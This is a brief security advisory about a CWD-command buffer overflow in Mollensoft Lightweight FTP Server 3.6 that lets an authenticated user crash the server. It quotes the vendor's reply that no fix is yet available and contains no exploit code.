Mollensoft Lightweight FTP Server CWD Buffer Overflow 
------------------------------------------------------------------------

SUMMARY

STORM has discovered a security vulnerability in 
<http://www.mollensoft.com/product2.htm> Mollensoft Lightweight FTP Server. 
Mollensoft Lightweight FTP Server's support for the CWD command incorrectly 
verifies that the buffer the CWD command doesn't overflow any of its internal 
buffers. This insufficient verification allows an authenticated (anonymous or 
otherwise) user to cause the FTP server to crash while trying to read an 
arbitrary memory location by issuing a malformed CWD command. 


DETAILS

Vulnerable Systems: 
 * Mollensoft Lightweight FTP Server version 3.6 

 Vendor Response: 
BigAl (author) responded with the following: 
I wrote this particular app with Visual Basic and used an FTP ActiveX COM 
component and I am waiting for the component creator to get back to me 
regarding the fix. Unfortunately I cannot snip off any of the commands, as 
access to the command length is not available from the VB component using 
straight VB Code. I am working on moving to .Net so hopefully I can have a 
new FTP server out by fall time frame which is truly multi-threaded and 
totally coded by me.
